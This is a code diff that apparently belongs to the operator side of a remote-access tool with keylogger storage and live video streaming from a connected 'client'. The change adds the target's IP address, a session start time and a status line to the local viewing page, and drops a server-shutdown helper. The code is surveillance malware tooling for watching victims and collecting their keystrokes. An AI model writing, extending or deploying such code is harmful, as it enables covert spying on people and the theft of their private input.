@@ -6,6 +6,7 @@ from colorama import Fore, init
 import cv2
 import numpy as np
 import keyboard  # Import the keyboard library
+from datetime import datetime
 
 init(autoreset=True)
 
@@ -16,7 +17,6 @@ streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
 
-# HTML template for video streaming with a stop button
 html_template = """
 <!doctype html>
 <html lang="en">
@@ -28,6 +28,9 @@ html_template = """
     <div>
       <img src="{{ url_for('video_feed') }}" width="640" height="480">
     </div>
+    <p><strong>Target IP:</strong> {{ target_ip }}</p>
+    <p><strong>Start Time:</strong> {{ start_time }}</p>
+    <p><strong>Status:</strong> {{ status }}</p>
     <button onclick="stopStreaming()">Stop Streaming</button>
     <script>
       function stopStreaming() {
@@ -40,9 +43,14 @@ html_template = """
 </html>
 """
 
+
 def start_streaming(client_socket, mode, client_id):
     global streaming
     streaming = True
+    target_ip = client_id.split(":")[0]
+    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get the current date and time
+    status = "Playing" if streaming else "Idle"
+
     print(Fore.BLUE + "[ * ] Starting streaming session...")
     time.sleep(1)
     print(Fore.BLUE + "[ * ] Preparing player...")
@@ -50,7 +58,7 @@ def start_streaming(client_socket, mode, client_id):
 
     @app.route('/')
     def index():
-        return render_template_string(html_template)
+        return render_template_string(html_template, target_ip=target_ip, start_time=start_time, status=status)
 
     @app.route(f'/video_feed_{client_id}')
     def video_feed():
@@ -61,14 +69,7 @@ def start_streaming(client_socket, mode, client_id):
     def stop_streaming():
         global streaming
         streaming = False
-        shutdown_server()
         return "Streaming stopped", 200
-
-    def shutdown_server():
-        func = request.environ.get('werkzeug.server.shutdown')
-        if func is None:
-            raise RuntimeError('Not running with the Werkzeug Server')
-        func()
 
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
